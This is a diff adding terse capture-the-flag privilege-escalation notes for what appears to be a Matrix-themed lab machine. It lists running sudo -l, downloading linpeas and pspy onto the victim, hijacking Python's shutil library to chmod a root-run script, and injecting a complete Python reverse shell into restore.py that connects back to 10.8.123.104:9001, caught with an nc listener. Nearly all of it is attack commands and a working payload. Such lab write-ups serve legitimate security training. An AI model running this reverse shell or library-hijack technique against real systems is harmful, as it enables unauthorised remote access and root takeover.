@@ -1,0 +1,24 @@
+
+
+sudo -l
+
+mysql info read
+
+wget linpeas.sh victim machine
+
+then;
+
+wget pspy64 victim machine
+
+library Hijacking shutil  ==> find -group death 2>/dev/null
+
+/usr/lib/python3.8
+
+cat shutil.py  ==> write => os.system('chmod 777 /home/morpheus/restore.py')
+
+then; go to restore.py => reverse Shell python code inject ==> import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.123.104",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
+
+
+Another Terminal;
+
+nc -nvlp 9001 => get connect BOMB! We are Morpheus
